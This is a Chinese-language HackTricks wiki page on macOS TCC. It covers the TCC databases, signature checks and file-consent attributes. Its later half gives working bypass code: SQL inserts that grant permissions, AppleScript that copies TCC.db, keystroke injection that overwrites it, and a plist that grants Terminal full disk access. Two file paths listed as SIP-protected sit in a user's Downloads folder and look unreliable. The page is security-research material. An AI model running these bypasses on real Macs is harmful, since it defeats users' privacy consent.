# macOS TCC

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **基本信息**

**TCC（透明性、同意和控制）**是一种安全协议，专注于规范应用程序权限。其主要作用是保护敏感功能，如**位置服务、联系人、照片、麦克风、相机、辅助功能和完整磁盘访问**。通过在授予应用程序访问这些元素之前强制要求用户明确同意，TCC增强了隐私和用户对其数据的控制。

当应用程序请求访问受保护功能时，用户会遇到TCC。这通过一个提示可见，允许用户**批准或拒绝访问**。此外，TCC还支持用户的直接操作，例如**将文件拖放到应用程序中**，以授予对特定文件的访问，确保应用程序仅访问明确允许的内容。

![TCC提示的示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**由位于`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`的**守护进程**处理，并在`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`中配置（注册mach服务`com.apple.tccd.system`）。

每个登录用户都有一个**用户模式tccd**在运行，定义在`/System/Library/LaunchAgents/com.apple.tccd.plist`中，注册mach服务`com.apple.tccd`和`com.apple.usernotifications.delegate.com.apple.tccd`。

在这里，您可以看到tccd作为系统和用户运行：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
权限是**从父应用程序继承**的，**权限**是**根据** **Bundle ID** 和 **Developer ID** **跟踪**的。

### TCC 数据库

允许/拒绝的信息存储在一些 TCC 数据库中：

* 系统范围的数据库在 **`/Library/Application Support/com.apple.TCC/TCC.db`**。
* 该数据库是**SIP 保护**的，因此只有 SIP 绕过才能写入。
* 用户 TCC 数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 用于每个用户的偏好设置。
* 该数据库受到保护，因此只有具有高 TCC 权限的进程（如完全磁盘访问）才能写入（但它不受 SIP 保护）。

{% hint style="warning" %}
之前的数据库也**受到 TCC 保护以进行读取访问**。因此，您**无法读取**常规用户 TCC 数据库，除非它来自具有 TCC 特权的进程。

但是，请记住，具有这些高权限的进程（如 **FDA** 或 **`kTCCServiceEndpointSecurityClient`**）将能够写入用户的 TCC 数据库。
{% endhint %}

* 在 **`/var/db/locationd/clients.plist`** 中还有一个**第三个** TCC 数据库，用于指示允许**访问位置服务**的客户端。
* SIP 保护文件 **`/Users/carlospolop/Downloads/REG.db`**（也受到 TCC 的读取访问保护）包含所有**有效 TCC 数据库**的**位置**。
* SIP 保护文件 **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（也受到 TCC 的读取访问保护）包含更多 TCC 授予的权限。
* SIP 保护文件 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（任何人都可以读取）是需要 TCC 例外的应用程序的允许列表。

{% hint style="success" %}
**iOS** 中的 TCC 数据库在 **`/private/var/mobile/Library/TCC/TCC.db`**。
{% endhint %}

{% hint style="info" %}
**通知中心 UI** 可以对**系统 TCC 数据库**进行**更改**：

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

然而，用户可以使用 **`tccutil`** 命令行工具 **删除或查询规则**。
{% endhint %}

#### 查询数据库

{% tabs %}
{% tab title="用户数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="系统数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
检查两个数据库，您可以查看应用程序允许、禁止或没有的权限（它会请求权限）。
{% endhint %}

* **`service`** 是 TCC **权限** 的字符串表示
* **`client`** 是具有权限的 **bundle ID** 或 **二进制文件路径**
* **`client_type`** 指示它是 Bundle Identifier(0) 还是绝对路径(1)

<details>

<summary>如果是绝对路径，如何执行</summary>

只需执行 **`launctl load you_bin.plist`**，plist 如下：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** 可以有不同的值：denied(0)、unknown(1)、allowed(2) 或 limited(3)。
* **`auth_reason`** 可以取以下值：Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
* **csreq** 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限：
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* 有关表格的**其他字段**的更多信息，请[**查看这篇博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。

您还可以在`系统偏好设置 --> 安全性与隐私 --> 隐私 --> 文件和文件夹`中检查**已授予的权限**。

{% hint style="success" %}
用户_可以_ **删除或查询规则**，使用**`tccutil`**。
{% endhint %}

#### 重置 TCC 权限
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 签名检查

TCC **数据库** 存储应用程序的 **Bundle ID**，但它也 **存储** **信息** 关于 **签名** 以 **确保** 请求使用权限的应用程序是正确的。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
因此，使用相同名称和包 ID 的其他应用程序将无法访问授予其他应用程序的权限。
{% endhint %}

### 权限与 TCC 权限

应用程序**不仅需要**请求并获得对某些资源的**访问权限**，它们还需要**拥有相关的权限**。\
例如，**Telegram** 拥有权限 `com.apple.security.device.camera` 来请求**访问相机**。一个**没有**此**权限的应用程序将无法**访问相机（用户甚至不会被询问权限）。

然而，应用程序要**访问**某些用户文件夹，例如 `~/Desktop`、`~/Downloads` 和 `~/Documents`，它们**不需要**任何特定的**权限**。系统将透明地处理访问并**根据需要提示用户**。

苹果的应用程序**不会生成提示**。它们在其**权限**列表中包含**预先授予的权利**，这意味着它们**永远不会生成弹出窗口**，**也**不会出现在任何**TCC 数据库**中。例如：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
这将避免日历询问用户访问提醒、日历和地址簿。

{% hint style="success" %}
除了关于权限的一些官方文档外，还可以在 [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) 找到一些非官方的**有趣信息**。
{% endhint %}

一些 TCC 权限包括：kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... 没有公开的列表定义所有权限，但您可以查看这个 [**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。

### 敏感未保护位置

* $HOME（本身）
* $HOME/.ssh, $HOME/.aws 等
* /tmp

### 用户意图 / com.apple.macl

如前所述，可以通过将文件拖放到应用程序上来**授予应用程序访问文件的权限**。此访问权限不会在任何 TCC 数据库中指定，而是作为文件的**扩展** **属性**。此属性将**存储允许的应用程序的 UUID**：
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
有趣的是，**`com.apple.macl`** 属性是由 **Sandbox** 管理的，而不是 tccd。

还要注意，如果你将允许计算机上某个应用的 UUID 的文件移动到另一台计算机，由于同一应用将具有不同的 UID，它将无法授予该应用访问权限。
{% endhint %}

扩展属性 `com.apple.macl` **无法像其他扩展属性那样被清除**，因为它是 **受 SIP 保护的**。然而，正如 [**在这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过 **压缩** 文件、**删除** 它并 **解压** 来禁用它。

## TCC 权限提升与绕过

### 插入到 TCC

如果在某个时刻你设法获得对 TCC 数据库的写入访问权限，你可以使用以下内容添加条目（删除注释）：

<details>

<summary>插入到 TCC 示例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

如果你成功进入了一个具有某些 TCC 权限的应用程序，请查看以下页面以获取 TCC 负载以进行滥用：

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Apple Events

了解 Apple Events 的内容：

{% content-ref url="macos-apple-events.md" %}
[macos-apple-events.md](macos-apple-events.md)
{% endcontent-ref %}

### Automation (Finder) to FDA\*

TCC 权限的名称是：**`kTCCServiceAppleEvents`**\
这个特定的 TCC 权限还指示了 **可以在 TCC 数据库中管理的应用程序**（因此权限并不允许管理所有内容）。

**Finder** 是一个 **始终具有 FDA** 的应用程序（即使它在 UI 中不显示），因此如果你对它拥有 **Automation** 权限，你可以滥用其权限以 **执行某些操作**。\
在这种情况下，你的应用程序需要对 **`com.apple.Finder`** 拥有权限 **`kTCCServiceAppleEvents`**。

{% tabs %}
{% tab title="Steal users TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="窃取系统 TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

你可以利用这个来**编写你自己的用户 TCC 数据库**。

{% hint style="warning" %}
拥有这个权限后，你将能够**请求 Finder 访问 TCC 限制的文件夹**并获取文件，但据我所知，你**无法让 Finder 执行任意代码**以完全滥用其 FDA 访问权限。

因此，你将无法滥用完整的 FDA 能力。
{% endhint %}

这是获取 Finder 自动化权限的 TCC 提示：

<figure><img src="../../../../.gitbook/assets/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
请注意，由于 **Automator** 应用具有 TCC 权限 **`kTCCServiceAppleEvents`**，它可以**控制任何应用**，如 Finder。因此，拥有控制 Automator 的权限后，你也可以使用如下代码控制 **Finder**：
{% endhint %}

<details>

<summary>在 Automator 中获取 shell</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

同样的情况发生在 **Script Editor app**，它可以控制 Finder，但使用 AppleScript 你无法强制它执行脚本。

### 自动化 (SE) 到某些 TCC

**系统事件可以创建文件夹操作，而文件夹操作可以访问一些 TCC 文件夹**（桌面、文档和下载），因此可以使用如下脚本来利用这种行为：
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

在 **`System Events`** 上的自动化 + 可访问性 (**`kTCCServicePostEvent`**) 允许向进程发送 **按键**。通过这种方式，您可以滥用 Finder 来更改用户的 TCC.db 或将 FDA 授予任意应用程序（尽管可能会提示输入密码）。

Finder 覆盖用户 TCC.db 示例：
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` 到 FDA\*

查看此页面以获取一些 [**滥用可访问性权限的有效载荷**](macos-tcc-payloads.md#accessibility) 以提升到 FDA\* 或运行键盘记录器，例如。

### **端点安全客户端到 FDA**

如果你有 **`kTCCServiceEndpointSecurityClient`**，你就有 FDA。结束。

### 系统策略系统管理员文件到 FDA

**`kTCCServiceSystemPolicySysAdminFiles`** 允许 **更改** 用户的 **`NFSHomeDirectory`** 属性，这会更改他的主文件夹，从而允许 **绕过 TCC**。

### 用户 TCC 数据库到 FDA

获得 **用户 TCC** 数据库的 **写权限** 你 \*\*不能\*\* 授予自己 **`FDA`** 权限，只有系统数据库中的用户可以授予。

但你可以 **授予** 自己 **`Finder 的自动化权限`**，并滥用之前的技术提升到 FDA\*。

### **FDA 到 TCC 权限**

**完全磁盘访问** 在 TCC 中的名称是 **`kTCCServiceSystemPolicyAllFiles`**

我认为这不是真正的权限提升，但以防你觉得有用：如果你控制一个具有 FDA 的程序，你可以 **修改用户的 TCC 数据库并授予自己任何访问权限**。这可以作为一种持久性技术，以防你可能失去 FDA 权限。

### **SIP 绕过到 TCC 绕过**

系统 **TCC 数据库** 受到 **SIP** 保护，这就是为什么只有具有 **指示的权限** 的进程才能修改它。因此，如果攻击者找到一个 **SIP 绕过** 通过一个 **文件**（能够修改一个受 SIP 限制的文件），他将能够：

* **移除 TCC 数据库的保护**，并授予自己所有 TCC 权限。他可以滥用这些文件中的任何一个，例如：
* TCC 系统数据库
* REG.db
* MDMOverrides.plist

然而，还有另一种选择可以滥用这个 **SIP 绕过来绕过 TCC**，文件 `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 是一个需要 TCC 例外的应用程序的允许列表。因此，如果攻击者可以 **移除此文件的 SIP 保护** 并添加他 **自己的应用程序**，该应用程序将能够绕过 TCC。\
例如添加终端：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC 绕过

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考文献

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
